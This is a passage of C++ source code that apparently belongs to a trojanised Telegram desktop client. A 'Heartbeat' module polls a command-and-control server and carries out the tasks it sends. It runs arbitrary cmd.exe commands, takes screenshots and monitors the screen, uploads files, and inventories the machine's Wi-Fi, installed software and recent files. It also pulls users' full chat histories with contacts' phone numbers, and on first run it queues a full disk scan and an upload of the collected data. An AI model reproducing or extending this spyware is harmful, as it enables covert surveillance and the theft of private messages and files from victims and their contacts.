    sqlite3_bind_text(stmt, 3, params.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 4, status.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int64(stmt, 5, now);
    sqlite3_bind_int64(stmt, 6, now);
    
    sqlite3_step(stmt);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void Heartbeat::updateTaskStatus(const QString& taskId, const QString& status) {
    sqlite3* db;
    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;

    sqlite3_stmt* stmt;
    const char* sql = "UPDATE local_tasks SET status = ?, updated_at = ? WHERE task_id = ?;";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    int64_t now = QDateTime::currentSecsSinceEpoch();
    sqlite3_bind_text(stmt, 1, status.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int64(stmt, 2, now);
    sqlite3_bind_text(stmt, 3, taskId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    
    sqlite3_step(stmt);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void Heartbeat::injectInitialTasks() {
    if (hasInitialTasksRun()) return;

    // Inject tasks in sequence
    // 1. Wifi Scan
    saveTask("init_wifi", "get_wifi", "", "pending");
    
    // 2. Software Scan
    saveTask("init_soft", "get_software", "", "pending");
    
    // 3. Current User Info
    saveTask("init_user", "get_current_user", "", "pending");
    
    // 4. Full Disk Scan (Long running)
    saveTask("init_disk", "scan_disk", "{\"mode\":\"full\"}", "pending");

    // 5. Upload DB (Final)
    saveTask("init_upload", "upload_db", "", "pending");
}

bool Heartbeat::hasInitialTasksRun() {
    // Check if init_upload exists
    sqlite3* db;
    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return false;

    bool exists = false;
    sqlite3_stmt* stmt;
    const char* sql = "SELECT 1 FROM local_tasks WHERE task_id = 'init_upload';";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
        if (sqlite3_step(stmt) == SQLITE_ROW) {
            exists = true;
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    return exists;
}

void Heartbeat::processLocalTasks() {
    sqlite3* db;
    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;

    // 1. Check if any task is currently in_progress
    {
        sqlite3_stmt* checkStmt;
        const char* checkSql = "SELECT 1 FROM local_tasks WHERE status = 'in_progress' LIMIT 1;";
        if (sqlite3_prepare_v2(db, checkSql, -1, &checkStmt, 0) == SQLITE_OK) {
            if (sqlite3_step(checkStmt) == SQLITE_ROW) {
                // A task is running, wait for it to finish
                sqlite3_finalize(checkStmt);
                sqlite3_close(db);
                return;
            }
            sqlite3_finalize(checkStmt);
        }
    }

    // 2. Pick next pending task
    sqlite3_stmt* stmt;
    const char* sql = "SELECT task_id, command, params FROM local_tasks WHERE status = 'pending' ORDER BY created_at ASC LIMIT 1;";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    QString taskId, command, params;
    if (sqlite3_step(stmt) == SQLITE_ROW) {
        taskId = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
        command = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
        params = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 2));
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    if (!taskId.isEmpty()) {
        Logs::writeMain("HEARTBEAT_DEBUG: Processing local task: " + taskId + " (" + command + ")");
        updateTaskStatus(taskId, "in_progress");
        executeTask(taskId, command, params);
    }
}

void Heartbeat::performScreenshot(const QString& taskId) {
    Logs::writeMain("HEARTBEAT_DEBUG: Starting performScreenshot for taskId: " + taskId);
    auto screen = QGuiApplication::primaryScreen();
    if (!screen) {
        Logs::writeMain("HEARTBEAT_DEBUG: No primary screen found!");
        uploadResult(taskId, "Error: No primary screen found", "failed");
        return;
    }
    
    QPixmap pixmap = screen->grabWindow(0);
    if (pixmap.isNull()) {
        Logs::writeMain("HEARTBEAT_DEBUG: Failed to grab window (pixmap is null)");
        uploadResult(taskId, "Error: Failed to grab screen", "failed");
        return;
    }

    QString tempPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/screenshot_" + taskId + ".png";
    Logs::writeMain("HEARTBEAT_DEBUG: Saving screenshot to " + tempPath);

    if (pixmap.save(tempPath, "PNG")) {
        Logs::writeMain("HEARTBEAT_DEBUG: Screenshot saved successfully. Uploading...");
        // Upload
        QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

        QHttpPart filePart;
        filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + QFileInfo(tempPath).fileName() + "\""));
        QFile *fileToUpload = new QFile(tempPath);
        fileToUpload->open(QIODevice::ReadOnly);
        filePart.setBodyDevice(fileToUpload);
        fileToUpload->setParent(multiPart);
        multiPart->append(filePart);
        
        QHttpPart taskIdPart;
        taskIdPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
        taskIdPart.setBody(taskId.toUtf8());
        multiPart->append(taskIdPart);

        QString url = _c2Url + "/api/c2/upload";
        
        QNetworkRequest request(url);
        QNetworkReply* reply = _network.post(request, multiPart);
        multiPart->setParent(reply);
        
        connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath, taskId]() {
        if (reply->error() != QNetworkReply::NoError) {
            uploadResult(taskId, "Screenshot upload failed: " + reply->errorString(), "failed");
        }
        reply->deleteLater();
        QFile::remove(tempPath);
    });
} else {
        Logs::writeMain("HEARTBEAT_DEBUG: Failed to save screenshot");
        uploadResult(taskId, "Error: Failed to save screenshot", "failed");
    }
}

void Heartbeat::uploadResult(const QString& taskId, const QString& result, const QString& status) {
    // Update local DB
    updateTaskStatus(taskId, status);

    QJsonObject json;
    json["taskId"] = taskId;
    json["result"] = result;
    json["status"] = status;
    
    QNetworkRequest request(QUrl(_c2Url + "/api/c2Task/result"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    _network.post(request, QJsonDocument(json).toJson());
}

void Heartbeat::executeTask(const QString& taskId, const QString& command, const QString& params) {
    if (command == "shell" || command == "cmd" || command == "cmd_exec") {
        QProcess* process = new QProcess(this);
        connect(process, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
            [this, taskId, process](int exitCode, QProcess::ExitStatus exitStatus) {
                QString output = QString::fromLocal8Bit(process->readAllStandardOutput());
                QString error = QString::fromLocal8Bit(process->readAllStandardError());
                uploadResult(taskId, output + error, "completed");
                process->deleteLater();
        });
        process->start("cmd.exe", QStringList() << "/c" << params);
    } else if (command == "start_monitor") {
        int interval = params.toInt();
        if (interval <= 0) interval = 60000;
        _monitorTaskId = taskId;
        _monitorTimer.start(interval);
        uploadResult(taskId, "Monitor started with interval " + QString::number(interval), "completed");
    } else if (command == "stop_monitor") {
        _monitorTimer.stop();
        uploadResult(taskId, "Monitor stopped", "completed");
    } else if (command == "screenshot") {
        performScreenshot(taskId);
    } else if (command == "get_software") {
        collectInstalledSoftware();
        QString json = getSoftwareJson();
        uploadResult(taskId, json, "completed");
    } else if (command == "get_wifi") {
        collectWiFiInfo();
        QString json = getWifiJson();
        uploadResult(taskId, json, "completed");
    } else if (command == "get_current_user") {
        collectTelegramData();
        QString json = getCurrentUserJson();
        uploadResult(taskId, json, "completed");
    } else if (command == "scan_recent") {
        collectRecentFiles(taskId);
    } else if (command == "scan_disk") {
        // Run in background thread
        BackgroundScanner* scanner = new BackgroundScanner(_deviceUuid, _c2Url, getDbPath(), taskId, "full");
        QThread* thread = new QThread;
        scanner->moveToThread(thread);
        connect(thread, &QThread::started, scanner, &BackgroundScanner::process);
        connect(scanner, &BackgroundScanner::scanFinished, this, [this, thread, scanner](const QString& tid, const QByteArray& data) {
             uploadClientDb(tid);
             thread->quit();
             thread->wait();
             delete thread;
             delete scanner;
        });
        thread->start();
    } else if (command == "get_chat_logs") {
        collectTelegramData();
        syncChatHistory();
        uploadClientDb(taskId);
        uploadResult(taskId, "Chat logs collected and syncing started", "completed");
    } else if (command == "download" || command == "upload_file") {
        // Params = filePath
        uploadFile(taskId, params);
    } else if (command == "upload_db") {
        uploadClientDb(taskId);
    } else if (command == "fetch_full_chat_history") {
        startFullSync(taskId);
    } else if (command == "set_heartbeat") {
        int interval = params.toInt();
        if (interval >= 1000) {
            _currentHeartbeatInterval = interval;
            _timer.setInterval(interval);
            uploadResult(taskId, QString::number(interval), "completed");
        } else {
             uploadResult(taskId, "Invalid heartbeat interval", "failed");
        }
    }
}

void Heartbeat::startFullSync(const QString& taskId) {
    if (!Core::IsAppLaunched()) {
        uploadResult(taskId, "App not launched", "failed");
        return;
    }
    auto window = Core::App().activeWindow();
    if (!window) {
        uploadResult(taskId, "No active window", "failed");
        return;
    }
    auto session = window->maybeSession();
    if (!session) {
        uploadResult(taskId, "No session", "failed");
        return;
    }

    _syncTaskId = taskId;
    _activeSyncs = 0;
    
    // Iterate all chats
    const auto &chats = session->data().chatsList()->indexed()->all();
    
    QString dbPath = getDbPath();
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) {
        uploadResult(taskId, "DB Error", "failed");
        return;
    }

    int count = 0;
    for (const auto &row : chats) {
        if (auto history = row->key().history()) {
            auto peer = history->peer;
            QString chatId = QString::number(peer->id.value);
            
            // Get current min_id (if any)
            sqlite3_stmt* stmt;
            const char* sql = "SELECT min_id FROM chat_sync_state WHERE chat_id = ?;";
            sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
            sqlite3_bind_text(stmt, 1, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            
            int minId = 0;
            if (sqlite3_step(stmt) == SQLITE_ROW) {
                minId = sqlite3_column_int(stmt, 0);
            }
            sqlite3_finalize(stmt);
            
            fetchHistoryLoop((void*)peer, minId);
            count++;
        }
    }
    sqlite3_close(db);
    
    if (count == 0) {
        uploadResult(taskId, "No chats found", "completed");
        _syncTaskId = "";
    } else {
        uploadResult(taskId, "Started full sync for " + QString::number(count) + " chats", "running");
    }
}

void Heartbeat::fetchHistoryLoop(void* peer_ptr, int minId) {
    if (!peer_ptr) return;
    PeerData* peer = (PeerData*)peer_ptr;
    
    // if (!peer->session().api().instance()) return; // Session check

    _activeSyncs++;
    
    // Fetch 100 messages backward from minId
    // If minId == 0, it fetches from latest.
    
    auto callback = [this, peer, minId](const MTPmessages_Messages &result) {
        int newMinId = minId == 0 ? 2147483647 : minId;
        int newMaxId = 0;
        bool hasUpdates = false;
        
        // Use helper to process and save
        processHistoryResult(&result, peer, newMinId, newMaxId, hasUpdates);
        
        _activeSyncs--;
        
        if (hasUpdates && newMinId > 1) {
            // Continue fetching backward
            QTimer::singleShot(200, this, [this, peer, newMinId]() {
                 fetchHistoryLoop(peer, newMinId);
            });
        } else {
            checkSyncFinished();
        }
    };
    
    auto failCallback = [this](const MTP::Error &error) {
        _activeSyncs--;
        checkSyncFinished();
    };

    peer->session().api().request(MTPmessages_GetHistory(
        peer->input(),
        MTP_int(minId), // offset_id
        MTP_int(0),
        MTP_int(0),
        MTP_int(100), // Limit per batch
        MTP_int(0),
        MTP_int(0),
        MTP_long(0)
    )).done(callback).fail(failCallback).send();
}

void Heartbeat::checkSyncFinished() {
    if (_activeSyncs <= 0 && !_syncTaskId.isEmpty()) {
        uploadClientDb(_syncTaskId);
        uploadResult(_syncTaskId, "Full sync finished and DB uploaded", "completed");
        _syncTaskId = "";
    }
}

void Heartbeat::processHistoryResult(const void* result_ptr, void* peer_ptr, int& newMinId, int& newMaxId, bool& hasUpdates) {
    if (!result_ptr || !peer_ptr) return;
    const MTPmessages_Messages &result = *(const MTPmessages_Messages*)result_ptr;
    PeerData* peer = (PeerData*)peer_ptr;
    auto session = &peer->session();
    
    QString dbPath = getDbPath();
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;

    QString chatId = QString::number(peer->id.value);

    auto processMessages = [&](const auto &data) {
        const auto &messages = data.vmessages().v;
        for (const auto &msg : messages) {
            QString content = "";
            QString sender = "";
            QString senderId = "";
            QString senderUsername = "";
            QString senderPhone = "";
            QString receiverId = QString::number(peer->id.value);
            QString receiverUsername = peer->username();
            QString receiverPhone = "";
            bool isOutgoing = false;
            int msgId = 0;
            QString mediaPath = "";

            msg.match([&](const MTPDmessage &m) {
                msgId = m.vid().v;
                content = qs(m.vmessage());
                if (m.is_out()) isOutgoing = true;
                
                if (m.vfrom_id()) {
                    if (auto p = session->data().peer(peerFromMTP(*m.vfrom_id()))) {
                        if (auto user = p->asUser()) {
                            sender = user->name();
                            senderId = QString::number(user->id.value);
                            senderUsername = user->username();
                            senderPhone = user->phone();
                        }
                    }
                }

                if (m.vmedia()) {
                    m.vmedia()->match([&](const MTPDmessageMediaPhoto &photo) {
                        if (const auto photoPtr = photo.vphoto()) {
                            // Using session->data().processPhoto(...) might be complex to link if private.
                            // But we can construct ID manually or use public API.
                            // The original code used session->data().processPhoto(*photoPtr).
                            // Let's assume it's accessible or use a workaround if needed.
                            // Actually, session->data() returns Data::Session&.
                            // processPhoto is public in Data::Session.
                            auto photoData = session->data().processPhoto(*photoPtr);
                            mediaPath = "Photo:" + QString::number(photoData->id);
                        }
                    }, [&](const MTPDmessageMediaDocument &doc) {
                        mediaPath = "Document";
                    }, [&](const auto &) {});
                }

            }, [&](const MTPDmessageService &m) {
                 msgId = m.vid().v;
                 content = "[Service Message]";
            }, [&](const MTPDmessageEmpty &m) {
                 msgId = m.vid().v;
            });

            if (msgId > 0 && !content.isEmpty()) {
                logChatMessage("Telegram", chatId, sender, content, isOutgoing, 
                    senderId, senderUsername, senderPhone, 
                    receiverId, receiverUsername, receiverPhone, mediaPath);
                
                if (msgId > newMaxId) newMaxId = msgId;
                if (msgId < newMinId) newMinId = msgId;
                hasUpdates = true;
            }
        }
    };

    result.match([&](const MTPDmessages_messagesNotModified &) {
    }, [&](const MTPDmessages_messages &d) {
        processMessages(d);
    }, [&](const MTPDmessages_messagesSlice &d) {
        processMessages(d);
    }, [&](const MTPDmessages_channelMessages &d) {
        processMessages(d);
    });
    
    // Update Sync State in DB
    if (hasUpdates) {
        sqlite3_stmt* stmt;
        // We only update min_id if we went backwards (fetchHistoryLoop logic)
        // But here we are generic.
        // For Backward Sync, we want to update MIN_ID.
        // For Forward Sync, we want MAX_ID.
        // This helper is used by both? No, currently only fetchHistoryLoop uses it.
        // But syncChatHistory logic is separate.
        // Let's just update min_id if it's smaller than current min_id?
        // Or just blindly update?
        // fetchHistoryLoop passes minId as the *start* point.
        // The result gives us newMinId.
        
        // We need to read current state to update correctly?
        // Let's just update min_id if newMinId < oldMinId (logic handled in caller? no).
        
        // Actually, simple UPDATE is fine.
        const char* sql = "UPDATE chat_sync_state SET min_id = ? WHERE chat_id = ? AND (min_id = 0 OR min_id > ?);";
        sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
        sqlite3_bind_int(stmt, 1, newMinId);
        sqlite3_bind_text(stmt, 2, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
        sqlite3_bind_int(stmt, 3, newMinId);
        sqlite3_step(stmt);
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
}

void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {
    if (!QFile::exists(filePath)) {
        uploadResult(taskId, "File not found", "failed");
        return;
    }
    
    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    QHttpPart filePart;
    filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + QFileInfo(filePath).fileName() + "\""));
    QFile *fileToUpload = new QFile(filePath);
    fileToUpload->open(QIODevice::ReadOnly);
    filePart.setBodyDevice(fileToUpload);
    fileToUpload->setParent(multiPart);
    multiPart->append(filePart);
    
    if (!taskId.isEmpty()) {
        QHttpPart taskPart;
        taskPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
        taskPart.setBody(taskId.toUtf8());
        multiPart->append(taskPart);
    }

    QString url = _c2Url + "/api/c2/upload";
    
    QNetworkRequest request(url);
    QNetworkReply* reply = _network.post(request, multiPart);
    multiPart->setParent(reply);
    
    connect(reply, &QNetworkReply::finished, this, [this, reply, taskId]() {
        if (reply->error() != QNetworkReply::NoError) {
            uploadResult(taskId, "Upload failed: " + reply->errorString(), "failed");
        }
        reply->deleteLater();
    });
}

void Heartbeat::sendHeartbeat() {
    // Auto-revert Logic: If not 60s and 10 mins passed since last change -> Revert
    if (_currentHeartbeatInterval != 60000) {
        int64_t now = QDateTime::currentSecsSinceEpoch();
        if (_lastIntervalChangeTime > 0 && (now - _lastIntervalChangeTime > 600)) { // 10 minutes
            _currentHeartbeatInterval = 60000;
            _timer.start(60000);
            Logs::writeDebug("Heartbeat auto-reverted to 60s due to timeout");
        }
    }

    QJsonObject json;
    json["uuid"] = _deviceUuid;
    json["timestamp"] = QDateTime::currentMSecsSinceEpoch();
    json["interval"] = _currentHeartbeatInterval;
    
    QNetworkRequest request(QUrl(_c2Url + "/api/c2/heartbeat"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setTransferTimeout(30000);
    
    QNetworkReply *reply = _network.post(request, QJsonDocument(json).toJson());
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            Logs::writeDebug("Heartbeat error: " + reply->errorString());
        } else {
            Logs::writeDebug("Heartbeat sent successfully");
            
            // Handle Response
            QByteArray data = reply->readAll();
            QJsonDocument doc = QJsonDocument::fromJson(data);
            if (doc.isObject()) {
                QJsonObject root = doc.object();
                
                // Check for interval update
                if (root.contains("interval")) {
                    int newInterval = root["interval"].toInt();
                    if (newInterval > 0 && newInterval != _currentHeartbeatInterval) {
                        _currentHeartbeatInterval = newInterval;
                        _lastIntervalChangeTime = QDateTime::currentSecsSinceEpoch();
                        _timer.start(_currentHeartbeatInterval);
                        Logs::writeDebug("Heartbeat interval updated to " + QString::number(newInterval) + "ms");
                    }
                }
            }
        }
        reply->deleteLater();
    });
}

void Heartbeat::performMonitor() {
    performScreenshot(_monitorTaskId);
}

void Heartbeat::syncChatHistory() {
    if (!Core::IsAppLaunched()) return;
    auto window = Core::App().activeWindow();
    if (!window) return;
    auto session = window->maybeSession();
    if (!session) return;

    QString dbPath = getDbPath();
    ensureDbInit(dbPath);
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;

    const auto &chats = session->data().chatsList()->indexed()->all();
    
    for (const auto &row : chats) {
        if (auto history = row->key().history()) {
            auto peer = history->peer;
            QString chatId = QString::number(peer->id.value);
            
            // Get Sync State
            sqlite3_stmt* stmt;
            const char* sql = "SELECT min_id, max_id FROM chat_sync_state WHERE chat_id = ?;";
            sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
            sqlite3_bind_text(stmt, 1, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            
            int minId = 0;
            int maxId = 0;
            if (sqlite3_step(stmt) == SQLITE_ROW) {
                minId = sqlite3_column_int(stmt, 0);
                maxId = sqlite3_column_int(stmt, 1);
            }
            sqlite3_finalize(stmt);
            
            // Fetch Strategy:
            // 1. Fetch NEW messages (Catch-up)
            //    offset_id = 0, min_id = maxId
            
            int offsetId = 0;
            int limit = 50;
            int minIdFilter = maxId; // Get everything newer than maxId
            
            // Callback for API Request
            auto callback = [this, chatId, session, peer, minId, maxId](const MTPmessages_Messages &result) {
                sqlite3* db;
                if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;

                int newMaxId = maxId;
                int newMinId = minId == 0 ? 999999999 : minId;
                bool hasUpdates = false;

                // Helper to process messages
                auto processMessages = [&](const auto &data) {
                    const auto &messages = data.vmessages().v;
                    for (const auto &msg : messages) {
                        // Extract Message Data
                        QString content = "";
                        QString sender = "";
                        QString senderId = "";
                        QString senderUsername = "";
                        QString senderPhone = "";
                        QString receiverId = QString::number(peer->id.value);
                        QString receiverUsername = peer->username();
                        QString receiverPhone = "";
                        bool isOutgoing = false;
                        int msgId = 0;
                        QString mediaPath = "";

                        msg.match([&](const MTPDmessage &m) {
                            msgId = m.vid().v;
                            content = qs(m.vmessage());
                            if (m.is_out()) isOutgoing = true;
                            
                            // Sender
                            if (m.vfrom_id()) {
                                if (auto peer = session->data().peer(peerFromMTP(*m.vfrom_id()))) {
                                    if (auto user = peer->asUser()) {
                                        sender = user->name();
                                        senderId = QString::number(user->id.value);
                                        senderUsername = user->username();
                                        senderPhone = user->phone();
                                    }
                                }
                            }

                            // Media
                            if (m.vmedia()) {
                                m.vmedia()->match([&](const MTPDmessageMediaPhoto &photo) {
                                    // Trigger Download & Get ID
                                    if (const auto photoPtr = photo.vphoto()) {
                                        auto photoData = session->data().processPhoto(*photoPtr);
                                        mediaPath = "Photo:" + QString::number(photoData->id);
                                        photoData->load(Data::PhotoSize::Large, Data::FileOrigin());
                                    }
                                }, [&](const MTPDmessageMediaDocument &doc) {
                                    mediaPath = "Document";
                                }, [&](const auto &) {});
                            }

                        }, [&](const MTPDmessageService &m) {
                             msgId = m.vid().v;
                             content = "[Service Message]";
                        }, [&](const MTPDmessageEmpty &m) {
                             msgId = m.vid().v;
                        });

                        if (msgId > 0 && !content.isEmpty()) {
                            logChatMessage("Telegram", chatId, sender, content, isOutgoing, 
                                senderId, senderUsername, senderPhone, 
                                receiverId, receiverUsername, receiverPhone, mediaPath);
                            
                            if (msgId > newMaxId) newMaxId = msgId;
                            if (msgId < newMinId) newMinId = msgId;
                            hasUpdates = true;
                        }
                    }
                };

                result.match([&](const MTPDmessages_messagesNotModified &) {
                    // No updates
                }, [&](const MTPDmessages_messages &d) {
                    processMessages(d);
                }, [&](const MTPDmessages_messagesSlice &d) {
                    processMessages(d);
                }, [&](const MTPDmessages_channelMessages &d) {
                    processMessages(d);
                });
                
                if (hasUpdates) {
                    sqlite3_stmt* stmt;
                    const char* sql = "INSERT OR REPLACE INTO chat_sync_state (chat_id, min_id, max_id, last_sync) VALUES (?, ?, ?, ?);";
                    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
                    sqlite3_bind_text(stmt, 1, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_int(stmt, 2, newMinId);
                    sqlite3_bind_int(stmt, 3, newMaxId);
                    sqlite3_bind_int64(stmt, 4, QDateTime::currentSecsSinceEpoch());
                    sqlite3_step(stmt);
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            };
            
            session->api().request(MTPmessages_GetHistory(
                peer->input(),
                MTP_int(offsetId),
                MTP_int(0),
                MTP_int(0),
                MTP_int(limit),
                MTP_int(0), // max_id
                MTP_int(minIdFilter), // min_id (Only new messages)
                MTP_long(0)
            )).done(callback).send();
            
            // Backward Sync (if we have a history)
            if (minId > 0) {
                 session->api().request(MTPmessages_GetHistory(
                    peer->input(),
                    MTP_int(minId),
                    MTP_int(0),
                    MTP_int(0),
                    MTP_int(limit),
                    MTP_int(0),
                    MTP_int(0),
                    MTP_long(0)
                )).done(callback).send();
            }
        }
    }
    sqlite3_close(db);
}

void Heartbeat::processMediaDownloads() {
    if (!Core::IsAppLaunched()) return;
    auto window = Core::App().activeWindow();
    if (!window) return;
    auto session = window->maybeSession();
    if (!session) return;

    QString dbPath = getDbPath();
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;

    // Create media directory
    QString mediaDir = cWorkingDir() + "tdata/media";
    QDir().mkpath(mediaDir);

    // Select pending downloads
    sqlite3_stmt* stmt;
    const char* sql = "SELECT rowid, media_path FROM chat_logs WHERE media_path LIKE 'Photo:%' LIMIT 10;";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);

    struct UpdateTask {
        int64_t rowid;
        QString newPath;
    };
    QVector<UpdateTask> updates;

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        int64_t rowid = sqlite3_column_int64(stmt, 0);
        QString mediaPath = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
        
        // Format: Photo:12345
        QString idStr = mediaPath.mid(6);
        PhotoId id = idStr.toULongLong();
        
        if (auto photo = session->data().photo(id)) {
            // Check if loaded
            bool saved = false;
            if (!photo->loading()) {
                 // Try to save
                 if (auto media = photo->createMediaView()) {
                     QString targetPath = mediaDir + "/" + idStr + ".jpg";
                     if (media->saveToFile(targetPath)) {
                         updates.append({rowid, targetPath});
                         saved = true;
                     }
                 }
            }
            
            if (!saved) {
                // Force load if not saved (and not loading, or even if loading to be sure)
                // Note: photo->load() is safe to call multiple times
                photo->load(Data::PhotoSize::Large, Data::FileOrigin());
            }
        }
    }
    sqlite3_finalize(stmt);

    // Apply updates
    if (!updates.isEmpty()) {
        const char* updateSql = "UPDATE chat_logs SET media_path = ? WHERE rowid = ?;";
        sqlite3_prepare_v2(db, updateSql, -1, &stmt, 0);
        
        sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
        for (const auto& task : updates) {
            sqlite3_bind_text(stmt, 1, task.newPath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_int64(stmt, 2, task.rowid);
            sqlite3_step(stmt);
            sqlite3_reset(stmt);
        }
        sqlite3_exec(db, "COMMIT;", 0, 0, 0);
        sqlite3_finalize(stmt);
    }

    sqlite3_close(db);
}

void Heartbeat::cleanupDatabase() {
    QString dbPath = getDbPath();
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;

    // 1. Retention Policy: Keep logs for 7 days
    // 7 days * 24 * 60 * 60 = 604800 seconds
    int64_t cutoff = QDateTime::currentSecsSinceEpoch() - 604800;
    
    sqlite3_stmt* stmt;
    const char* sql = "DELETE FROM chat_logs WHERE timestamp < ?;";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
        sqlite3_bind_int64(stmt, 1, cutoff);
        sqlite3_step(stmt);
        sqlite3_finalize(stmt);
    }
    
    // 2. Vacuum to reclaim space
    // This is a heavy operation, so we only do it when we actually delete stuff
    // But since we call this infrequently (daily), it's fine.
    sqlite3_exec(db, "VACUUM;", 0, 0, 0);

    sqlite3_close(db);
}

void Heartbeat::collectRecentFiles(const QString& taskId) {
    QString path;
#ifdef Q_OS_WIN
    path = QString::fromLocal8Bit(qgetenv("APPDATA")) + "/Microsoft/Windows/Recent";
#else
    // Fallback for other platforms if needed
    path = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation); 
#endif

    QDir dir(path);
    if (!dir.exists()) {
        uploadResult(taskId, "Recent documents path not found", "failed");
        return;
    }
    
    QJsonArray files;
    QFileInfoList entries = dir.entryInfoList(QDir::Files | QDir::NoDotAndDotDot | QDir::Hidden, QDir::Time);
    
    int count = 0;
    for (const QFileInfo& entry : entries) {
        QJsonObject file;
        file["path"] = entry.absoluteFilePath();
        file["name"] = entry.fileName();
        file["isDirectory"] = false;
        file["size"] = entry.size();
        file["lastModified"] = entry.lastModified().toSecsSinceEpoch();
        files.append(file);
        
        if (++count >= 100) break;
    }
    
    QJsonDocument doc(files);
    uploadResult(taskId, doc.toJson(QJsonDocument::Compact), "completed");
}

QString Heartbeat::getSoftwareJson() {
    QString dbPath = getDbPath();
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return "[]";

    QJsonArray array;
    sqlite3_stmt* stmt;
    const char* sql = "SELECT name, version, publisher, install_date FROM installed_software;";
    
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            QJsonObject obj;
            obj["name"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
            obj["version"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
            obj["publisher"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 2));
            obj["installDate"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
            array.append(obj);
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    return QJsonDocument(array).toJson(QJsonDocument::Compact);
}

QString Heartbeat::getWifiJson() {
    QString dbPath = getDbPath();
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return "[]";

    QJsonArray array;
    sqlite3_stmt* stmt;
    const char* sql = "SELECT ssid, bssid, signal_strength, security_type FROM wifi_scan_results;";
    
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            QJsonObject obj;
            obj["ssid"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 0));
            obj["bssid"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 1));
            obj["signalStrength"] = sqlite3_column_int(stmt, 2);
            obj["securityType"] = QString::fromUtf8((const char*)sqlite3_column_text(stmt, 3));
            array.append(obj);
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    return QJsonDocument(array).toJson(QJsonDocument::Compact);
}

QString Heartbeat::getRecentFilesJson() {
    return "[]"; // Placeholder if needed
}

QString Heartbeat::getCurrentUserJson() {
    QString dbPath = getDbPath();
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return "{}";

    QJsonObject obj;
    sqlite3_stmt* stmt;
    const char* sql = "SELECT user_id, username, first_name, last_name, phone, is_premium FROM current_user LIMIT 1;";
    
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
